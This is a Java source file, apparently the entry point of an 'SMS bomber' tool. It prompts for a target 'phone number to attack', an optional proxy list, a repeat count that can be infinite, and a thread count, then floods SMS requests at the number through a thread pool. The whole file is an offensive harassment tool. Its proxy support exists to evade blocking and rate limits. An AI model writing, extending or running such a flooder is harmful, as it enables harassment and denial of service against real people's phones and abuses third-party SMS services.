package ir.mrsf.smsbomber;

import ir.mrsf.smsbomber.managers.ConfigManager;
import ir.mrsf.smsbomber.managers.ProxyManager;
import ir.mrsf.smsbomber.utils.RequestUtil;
import lombok.Getter;

import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

@Getter
public class SMSBomber {
    @Getter
    private static SMSBomber smsBomber;
    private final ProxyManager proxyManager;
    private final ConfigManager configManager;

    public static void main(String[] args) {
        new SMSBomber();
    }

    public SMSBomber() {
        smsBomber = this;
        this.configManager = new ConfigManager();
        this.proxyManager = new ProxyManager();
        final Scanner scanner = new Scanner(System.in);

        System.out.println("Proxy mode (y or n): ");
        final String proxyMode = scanner.nextLine();

        if (proxyMode.equalsIgnoreCase("y")) {
            System.out.println("Loading Proxy List...");
            proxyManager.load();
            System.out.println(this.proxyManager.getProxies().size() + " Proxy loaded");
            if (this.proxyManager.getProxies().isEmpty()) {
                System.out.println("No working proxies available.");
                return;
            }
        }

        System.out.println("Please enter the phone number to attack: ");
        final String phone = scanner.nextLine();

        System.out.print("Please enter repeat count to attack (-1 to infinite): ");
        final int repeatCount = scanner.nextInt();

        System.out.print("Please enter thread count to attack (recommended 20): ");
        final int threadCount = scanner.nextInt();
        ExecutorService executor;

        if (repeatCount == -1) {
            executor = Executors.newFixedThreadPool(threadCount);
            //noinspection InfiniteLoopStatement
            while (true) {
                RequestUtil.sendSMSRequest(executor, phone);
            }
        }

        executor = Executors.newFixedThreadPool(threadCount);
        for (int i = 0; i < repeatCount; i++) {
            RequestUtil.sendSMSRequest(executor, phone);
        }

        executor.shutdown();
        try {
            executor.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        System.out.println("Done");
    }

}
